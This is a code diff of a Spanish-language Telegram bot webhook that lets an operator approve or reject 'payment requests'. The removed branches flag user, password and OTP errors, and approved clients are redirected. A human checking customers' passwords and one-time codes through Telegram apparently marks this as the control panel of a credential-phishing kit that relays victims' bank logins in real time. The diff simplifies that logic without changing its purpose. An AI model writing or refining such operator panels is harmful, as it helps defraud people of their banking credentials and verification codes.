@@ -37,43 +37,8 @@ export default async function handler(req, res) {
 
                 console.log('🔘 Botón presionado:', callbackData);
 
-                // Determinar acción y solicitudId
-                let action, solicitudId, respuestaTexto, estadoMensaje;
-
-                if (callbackData.startsWith('approve_')) {
-                    action = 'approved';
-                    solicitudId = callbackData.replace('approve_', '');
-                    respuestaTexto = '✅ Pago aprobado';
-                    estadoMensaje = '✅ *APROBADO* - El cliente será redirigido';
-                } else if (callbackData.startsWith('reject_')) {
-                    action = 'rejected';
-                    solicitudId = callbackData.replace('reject_', '');
-                    respuestaTexto = '❌ Pago rechazado';
-                    estadoMensaje = '❌ *RECHAZADO* - Se mostrará error al cliente';
-                } else if (callbackData.startsWith('user_error_')) {
-                    action = 'user_error';
-                    solicitudId = callbackData.replace('user_error_', '');
-                    respuestaTexto = '❌ Error de usuario - Datos no coinciden';
-                    estadoMensaje = '❌ *ERROR USUARIO* - Los datos ingresados no coinciden';
-                } else if (callbackData.startsWith('pass_error_')) {
-                    action = 'pass_error';
-                    solicitudId = callbackData.replace('pass_error_', '');
-                    respuestaTexto = '❌ Error de contraseña - Datos no coinciden';
-                    estadoMensaje = '❌ *ERROR CONTRASEÑA* - Los datos ingresados no coinciden';
-                } else if (callbackData.startsWith('otp_error_')) {
-                    action = 'otp_error';
-                    solicitudId = callbackData.replace('otp_error_', '');
-                    respuestaTexto = '❌ Error de OTP - Código inválido';
-                    estadoMensaje = '❌ *ERROR OTP* - Código de verificación erróneo, intenta de nuevo';
-                } else {
-                    // Si no coincide con ningún patrón conocido
-                    console.log('⚠️ Acción desconocida:', callbackData);
-                    const [actionTemp, idTemp] = callbackData.split('_');
-                    action = actionTemp || 'unknown';
-                    solicitudId = idTemp || 'unknown';
-                    respuestaTexto = 'Acción procesada';
-                    estadoMensaje = 'Procesado';
-                }
+                // Extraer ID de solicitud y acción
+                const [action, solicitudId] = callbackData.split('_');
 
                 // Responder al callback query inmediatamente
                 await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
@@ -81,12 +46,17 @@ export default async function handler(req, res) {
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         callback_query_id: callbackId,
-                        text: respuestaTexto,
+                        text: action === 'approve' ? '✅ Pago aprobado' : '❌ Pago rechazado',
                         show_alert: false
                     })
                 });
 
                 // Actualizar el mensaje en Telegram
+                const estadoEmoji = action === 'approve' ? '✅ APROBADO' : '❌ RECHAZADO';
+                const estadoMensaje = action === 'approve' 
+                    ? '✅ *APROBADO* - El cliente será redirigido' 
+                    : '❌ *RECHAZADO* - Se mostrará error al cliente';
+
                 const newText = originalText.replace(
                     '⏳ *Estado:* Esperando verificación...',
                     `⏳ *Estado:* ${estadoMensaje}`
@@ -105,18 +75,17 @@ export default async function handler(req, res) {
 
                 // Guardar el estado de la solicitud
                 global.solicitudes.set(solicitudId, {
-                    estado: action,
+                    estado: action === 'approve' ? 'approved' : 'rejected',
                     timestamp: Date.now(),
                     chatId: chatId,
                     messageId: messageId
                 });
 
-                console.log(`✅ Solicitud ${solicitudId}: ${action}`);
+                console.log(`✅ Solicitud ${solicitudId}: ${action === 'approve' ? 'APROBADA' : 'RECHAZADA'}`);
 
                 return res.status(200).json({ 
                     success: true, 
-                    action: action,
-                    message: `Solicitud ${solicitudId}: ${action}` 
+                    message: `Solicitud ${solicitudId} ${action === 'approve' ? 'aprobada' : 'rechazada'}` 
                 });
             }
 
@@ -199,5 +168,4 @@ export default async function handler(req, res) {
     }
 
     return res.status(405).json({ error: 'Método no permitido' });
-}
 }
